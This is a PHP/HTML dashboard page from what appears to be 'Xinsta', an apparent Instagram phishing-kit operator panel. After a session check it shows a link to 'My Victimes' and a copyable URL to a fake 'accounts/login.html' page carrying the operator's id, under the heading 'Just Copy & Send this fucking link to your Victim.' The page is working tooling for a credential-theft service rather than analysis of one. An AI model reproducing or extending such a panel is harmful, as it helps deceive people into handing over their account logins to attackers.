<?php
session_start();
if ($_SESSION['login'] != "true") {
  header("Location: index.php");
  die();
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, intiale-scale=1.0">
	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.2.0/css/all.css" integrity="sha384-hWVjflwFxL6sNzntih27bfxkr27PmbbK/iSvJ+a4+0owXq79v+lsFkW54bOGbiDQ" crossorigin="anonymous">
	<link href="https://fonts.googleapis.com/css?family=Roboto" rel="stylesheet">
	<link rel="stylesheet" type="text/css" href="assets/css/normalize.css">
	<link rel="stylesheet" type="text/css" href="assets/css/styleDashboard.css">
	<link rel="stylesheet" type="text/css" href="assets/css/scrollbar.css">
	<link rel="icon" href="assets/img/icon.png">
	<title>Xinsta - Dashboard</title>
</head>
<body>
	<nav>
		<div id="container">
			<img src="assets/img/icon.png" alt="" id="navbar_img">
			<div id="btns">
				<a href="logout.php?log=out"><button id="btnLogOut">Log Out</button></button>
				<div id="btnVictime">
  				<a href="victimes.php">My Victimes</a>
				</div>
			</div>
		</div>
	</nav>
<div id="container">
	<div id="dashboard_content">
		<h2 id="dashboard_content_title">Just Copy & Send this fucking link to your Victim.</h2>
		<center><div id="urlxbtn">
			<input type="text" name="url" id="url" class="url" value="<?php echo 'https://vadfmmuqyi1vq3hibnc26w-on.drv.tw/accounts/login.html?i='.$_SESSION['C_id']; ?>" disabled>
			<button name="btn" id="btn"><span id="revert">COPY</span></button>
		</div></center>
	</div>

</div>
<div id="clear"></div>

<footer id="footer">Xinsta All rights reserved.</footer>

<script src="https://code.jquery.com/jquery-3.3.1.js"></script>
<script type="text/javascript" src="assets/js/index.js"></script>
</body>
</html>